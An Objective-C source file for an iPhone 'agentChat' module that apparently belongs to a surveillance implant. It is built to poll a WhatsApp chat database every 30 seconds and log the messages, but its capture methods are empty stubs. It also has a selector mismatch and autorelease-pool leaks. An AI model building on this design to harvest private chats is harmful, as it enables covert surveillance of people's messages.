//
//  RCSIAgentChat.m
//  RCSIphone
//
//  Created by armored on 7/25/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "RCSIAgentChat.h"

#define k_i_AgentChatRunLoopMode @"k_i_AgentChatRunLoopMode"
#define CHAT_TIMEOUT 30


@implementation agentChat

#pragma mark -
#pragma mark - Initialization 
#pragma mark -

- (id)init
{
    self = [super init];
    if (self) {

    }
    
    return self;
}

#pragma mark -
#pragma mark Agent chat methods
#pragma mark -

- (void)writeWAChatLog:(NSArray*)chatArray
{
  
}

- (sqlite3*)openWAChat
{
  sqlite3 *db = NULL;
  
  if ([self isThreadCancelled] == TRUE)
  {
    [self setMAgentStatus:AGENT_STATUS_STOPPED];
    return db;
  }
  
  return db;
}

- (NSArray*)getWAChats:(sqlite3*)db
{ 
  NSArray *chatArray = nil;
  
  if ([self isThreadCancelled] == TRUE)
  {
    [self setMAgentStatus:AGENT_STATUS_STOPPED];
    return chatArray;
  }
  return chatArray;
}

- (void)getChat
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSArray *chatEntries = nil;
  sqlite3 *db;
  
  if ([self isThreadCancelled] == TRUE)
  {
    [self setMAgentStatus:AGENT_STATUS_STOPPED];
    return;
  }
  
  if ((db = [self openWAChat]) == NULL)
    return;
  
  if ((chatEntries = [self getWAChats:db]) != nil)
    [self writeWAChatLog:chatEntries];

  [pool release];
}

- (void)setChatPollingTimeOut:(NSTimeInterval)aTimeOut 
{    
  NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: aTimeOut 
                                                    target: self 
                                                  selector: @selector(getChat:) 
                                                  userInfo: nil 
                                                   repeats: YES];
  
  [[NSRunLoop currentRunLoop] addTimer: timer forMode: k_i_AgentChatRunLoopMode];
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (void)startAgent
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  if ([self isThreadCancelled] == TRUE)
  {
    [self setMAgentStatus:AGENT_STATUS_STOPPED];
    [outerPool release];
    return;
  }
  
  [self setChatPollingTimeOut:CHAT_TIMEOUT];
  
  while ([self mAgentStatus] == AGENT_STATUS_RUNNING)
  {
    NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    
    [[NSRunLoop currentRunLoop] runMode: k_i_AgentChatRunLoopMode 
                             beforeDate: [NSDate dateWithTimeIntervalSinceNow: 1.00]];
    
    [innerPool release];
  }
  
  [self setMAgentStatus:AGENT_STATUS_STOPPED];
  
  [outerPool release];
}

- (BOOL)stopAgent
{
  [self setMAgentStatus: AGENT_STATUS_STOPPING];
  return YES;
}

- (BOOL)resume
{
  return YES;
}
@end
